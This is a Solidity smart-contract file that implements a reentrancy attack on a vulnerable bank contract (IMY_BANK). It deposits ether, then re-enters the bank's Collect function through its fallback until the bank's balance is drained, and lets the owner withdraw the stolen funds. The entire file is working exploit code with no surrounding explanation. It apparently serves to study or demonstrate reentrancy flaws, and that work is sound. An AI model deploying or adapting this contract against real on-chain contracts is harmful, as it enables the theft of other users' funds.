pragma solidity ^0.4.25;

interface IMY_BANK {
    function Put(uint _unlockTime) external payable;
    function Collect(uint _am) external;
}

contract ReentrancyAttack {
    IMY_BANK public vulnerableBank;
    address public owner;
    uint public withdrawAmount = 1 ether;

    constructor(address _bankAddress) public {
        vulnerableBank = IMY_BANK(_bankAddress);
        owner = msg.sender;
    }

    // Start the attack
    function attack() public payable {
        require(msg.value >= 1 ether);
        vulnerableBank.Put.value(msg.value)(now); // deposit with current timestamp
        vulnerableBank.Collect(withdrawAmount);
    }

    // Fallback is triggered during reentrant call
    function () external payable {
        if (address(vulnerableBank).balance >= withdrawAmount) {
            vulnerableBank.Collect(withdrawAmount); // recursive call
        }
    }

    function withdraw() public {
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }
}

